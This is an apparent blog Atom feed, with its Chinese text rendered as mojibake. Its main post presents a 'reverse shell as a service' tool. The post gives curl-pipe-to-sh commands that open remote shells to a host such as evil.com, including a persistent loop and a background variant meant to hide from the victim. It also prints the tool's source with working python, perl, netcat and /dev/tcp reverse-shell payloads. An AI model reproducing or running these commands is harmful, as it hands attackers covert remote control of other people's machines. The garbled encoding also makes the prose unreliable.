<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ukonwho.github.io</id>
    <title>Gridea</title>
    <updated>2020-05-22T07:30:12.008Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ukonwho.github.io"/>
    <link rel="self" href="https://ukonwho.github.io/atom.xml"/>
    <subtitle>æ¸©æ•…è€ŒçŸ¥æ–°</subtitle>
    <logo>https://ukonwho.github.io/images/avatar.png</logo>
    <icon>https://ukonwho.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[å¿«é€Ÿå°è¯•å¤šç§åå¼¹shell]]></title>
        <id>https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/</id>
        <link href="https://ukonwho.github.io/post/kuai-su-chang-shi-duo-chong-fan-dan-shell/">
        </link>
        <updated>2020-05-22T07:06:17.000Z</updated>
        <content type="html"><![CDATA[<p>Reverse Shell as a Service - https://shell.now.sh</p>
<ul>
<li>é¡¹ç›®åœ°å€ï¼šhttps://github.com/lukechilds/reverse-shell</li>
</ul>
<h1 id="ä½¿ç”¨">ä½¿ç”¨</h1>
<h2 id="1-å¸¸è§„ç”¨æ³•">1. å¸¸è§„ç”¨æ³•</h2>
<pre><code class="language-bash"># é€šè¿‡ipè¿æ¥
curl https://shell.now.sh/192.168.0.69:1337 | sh

# é€šè¿‡ä¸»æœºåè¿æ¥
curl https://shell.now.sh/localhost:1337 | sh

# è¿œç¨‹è¿æ¥ï¼Œå› ä¸ºè¿™æ˜¯åå‘è¿æ¥ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç©¿é€é˜²ç«å¢™å¹¶è¿æ¥åˆ°Internet
# æ‚¨å¯ä»¥åœ¨evil.comä¸Šçš„æœåŠ¡å™¨ä¸Šä¾¦å¬è¿æ¥ï¼Œå¹¶ä»å…·æœ‰å®‰å…¨ç½‘ç»œçš„å†…éƒ¨è·å¾—åå‘shell
curl https://shell.now.sh/evil.com:1337 | sh
</code></pre>
<h2 id="2-ä¿æŒé‡è¿">2. ä¿æŒé‡è¿</h2>
<pre><code class="language-bash">while true; do curl https://shell.now.sh/yourip:1337 | sh; done
</code></pre>
<h2 id="3-ä½œä¸ºåå°è¿›ç¨‹è¿è¡Œ">3. ä½œä¸ºåå°è¿›ç¨‹è¿è¡Œ</h2>
<p>ç»ˆç«¯ä¼šè¯éœ€è¦ä¿æŒæ‰“å¼€çŠ¶æ€ä»¥ä¿æŒåå‘shellè¿æ¥ã€‚</p>
<p>ä»¥ä¸‹å‘½ä»¤å°†åœ¨åå°è¿›ç¨‹ä¸­è¿è¡Œåå‘shellç¨‹åºå¹¶é€€å‡ºç»ˆç«¯ï¼Œåœ¨å—å®³è€…çš„è®¡ç®—æœºä¸Šæ²¡æœ‰æ‰“å¼€çœ‹èµ·æ¥å¯ç–‘çš„ç»ˆç«¯çª—å£ã€‚</p>
<p>ç¡®ä¿åœ¨æ–°çš„ç»ˆç«¯çª—å£ä¸­è¿è¡Œæ­¤å‘½ä»¤ï¼Œå¦åˆ™å°†ä¸¢å¤±ç°æœ‰ä¼šè¯ä¸­çš„ä»»ä½•å·¥ä½œã€‚</p>
<pre><code class="language-bash">sh -c &quot;curl https://shell.now.sh/localhost:1337 | sh -i &amp;&quot; &amp;&amp; exit
</code></pre>
<h1 id="æ¼”ç¤º">æ¼”ç¤º</h1>
<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590131423766.gif" alt="" loading="lazy"></figure>
<h1 id="å…³é”®ä»£ç ">å…³é”®ä»£ç </h1>
<pre><code class="language-javascript">'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generateScript = (host, port) =&gt; {
	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;${host}&quot;,${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'`,
		perl: `perl -e 'use Socket;$i=&quot;${host}&quot;;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'`,
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ${host} ${port} &gt;/tmp/f`,
		sh: `/bin/sh -i &gt;&amp; /dev/tcp/${host}/${port} 0&gt;&amp;1`
	};

	return Object.entries(payloads).reduce((script, [cmd, payload]) =&gt; {
		script += `
if command -v ${cmd} &gt; /dev/null 2&gt;&amp;1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req =&gt; {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host &amp;&amp; port &amp;&amp; generateScript(host, port));
};

module.exports = reverseShell;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[New beginning]]></title>
        <id>https://ukonwho.github.io/post/new-begining/</id>
        <link href="https://ukonwho.github.io/post/new-begining/">
        </link>
        <updated>2020-05-21T16:00:00.000Z</updated>
        <content type="html"><![CDATA[<p>ğŸ˜˜ Enjoy~</p>
]]></content>
    </entry>
</feed>